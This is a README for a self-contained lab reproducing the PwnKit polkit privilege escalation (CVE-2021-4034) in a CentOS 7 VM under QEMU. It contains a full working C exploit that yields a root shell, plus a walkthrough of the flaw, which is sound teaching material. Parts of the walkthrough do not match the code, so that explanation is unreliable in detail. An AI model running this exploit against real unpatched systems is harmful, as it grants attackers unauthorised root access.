# PwnKit QEMU Lab (CVE-2021-4034)

Lab that **works on a modern host** (Kali, kernel ≥ 5.18).

## Why QEMU and not a simple Docker container?

Starting from Linux kernel **5.18**, the kernel refuses `argc == 0` (it injects an empty string and forces `argc = 1`).

PwnKit relies entirely on `argc == 0` for out-of-bounds writing in `envp`. A Docker container **shares the host's kernel** → the exploit is neutralized before reaching polkit.

Here, we run a **real CentOS 7 VM** (kernel **3.10**) via QEMU.
The guest kernel is old → PwnKit works end-to-end.

```
Kali (kernel 6.x)
  └── Docker (privileged + /dev/kvm if available)
        └── QEMU
              └── CentOS 7.9 (kernel 3.10.0-…)
                    ├── polkit-0.112-26.el7   ← vulnerable
                    ├── user lab / lab
                    └── SSH → localhost:2222

```

## Prerequisites

* Docker + Docker Compose
* ~1.5 GB disk space (CentOS image ~850 MB, downloaded once)
* KVM recommended (`/dev/kvm`) for fast boot

```bash
ls -l /dev/kvm
# If the file does not exist: the lab still works (TCG, slower)

```

## Startup

```bash
cd pwnkit-qemu-lab

sudo docker compose build
sudo docker compose up target

```

**First launch**:

1. Download CentOS image (~850 MB)
2. cloud-init configures `lab` account + vault repos
3. VM Boot
* with KVM: ~30–60 s
* without KVM (TCG): 2–5 min



Leave this terminal open (QEMU console).

In a **second** terminal:

```bash
./connect.sh
# or manually:
# ssh -p 2222 lab@127.0.0.1
# password: lab

```

## Exploitation

Once connected:

```bash
# Checks
uname -r              # must be 3.10.0-...
rpm -q polkit         # polkit-0.112-26.el7...  (without _9.1)
ls -l /usr/bin/pkexec # -rwsr-xr-x

# gcc is installed by cloud-init; otherwise:
sudo yum install -y gcc make

# PoC
cd /tmp
cat > pwnkit.c << 'POC'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
char *shell =
  "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n"
  "void gconv() {}\n"
  "void gconv_init() {\n"
  "  setuid(0); setgid(0); seteuid(0); setegid(0);\n"
  "  system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin;\"\n"
  "         \"rm -rf 'GCONV_PATH=.' pwnkit; /bin/sh -p\");\n"
  "  exit(0);\n"
  "}\n";
int main() {
  FILE *fp;
  system("rm -rf 'GCONV_PATH=.' pwnkit 2>/dev/null");
  system("mkdir -p 'GCONV_PATH=.' pwnkit");
  system("touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'");
  system("echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules");
  fp = fopen("pwnkit/pwnkit.c", "w");
  fprintf(fp, "%s", shell);
  fclose(fp);
  system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");
  char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };
  execve("/usr/bin/pkexec", (char*[]){NULL}, env);
}
POC

gcc pwnkit.c -o pwnkit
./pwnkit
id
id
# uid=0(root) gid=0(root) groups=0(root),...

```

You should get a root shell immediately.

## Shutdown

In the QEMU terminal: **Ctrl-a** then **x**

```bash
sudo docker compose down

```

To also delete the downloaded disk image:

```bash
sudo docker compose down -v

```

### Core Vulnerability Mechanism

The vulnerability lies in how `pkexec` processes command-line arguments when executed with an empty argument vector (`argc == 0`).

Under normal execution:

* `argv[0]` contains the executable name (`"pkexec"`).
* `argv[1]` contains the command to execute (e.g., `"/bin/bash"`).

When invoked via `execve("/usr/bin/pkexec", [], env)`:

* The kernel passes an empty `argv` array (`argc = 0`).
* In Linux memory layout, environment variables (`envp`) immediately follow arguments (`argv`) in memory.

---

### Step-by-Step Exploitation Chain

#### 1. **Out-of-Bounds Read (`argc = 0`) & Write:**
`pkexec` uses a loop that starts reading arguments at index `1`:
```c
for (n = 1; n < argc; n++) { ... }

```


Because `argc` is `0`, `n` is set to `1` out of range, causing `pkexec` to read `argv[1]`. Due to memory contiguous allocation, reading `argv[1]` actually reads `envp[0]`, which holds the first environment variable (`"PATH=GCONV_PATH=."`).
#### 2. **Path Resolution Bypass:**
`pkexec` tries to locate the command using `g_find_program_in_path()`.
Since `argv[1]` evaluated to `"PATH=GCONV_PATH=."`, `pkexec` looks for an executable named `"PATH=GCONV_PATH=."` inside the directories listed in `PATH`.
Because we created a directory called `GCONV_PATH=.` containing a dummy executable named `PATH=GCONV_PATH=.`, the function resolves the full path as `GCONV_PATH=./PATH=GCONV_PATH=.`.
#### 3. **Environment Injection:**
`pkexec` writes the newly resolved full path back into `argv[1]`:
```c
argv[1] = path; // Overwrites envp[0] in memory!

```


This overwrites `envp[0]` with `"GCONV_PATH=./PATH=GCONV_PATH=."`.
#### 4. **Bypassing `clearenv()` Restrictions:**
Normally, SUID binaries purge dangerous environment variables like `GCONV_PATH` or `LD_PRELOAD` upon startup. However, by injecting `GCONV_PATH` **after** the initial environment sanitization pass, the variable stays active in the process environment.
#### 5. **Arbitrary Code Execution as Root:**
Later in execution, `pkexec` calls `g_printerr()`, which uses `iconv` to format localized error messages.
`iconv` reads `GCONV_PATH` to locate payload modules. It loads our custom shared library (`pwnkit.so`) defined in `gconv-modules`. Upon loading, `gconv_init()` runs with elevated SUID permissions, executing `setuid(0)` and spawning a root shell.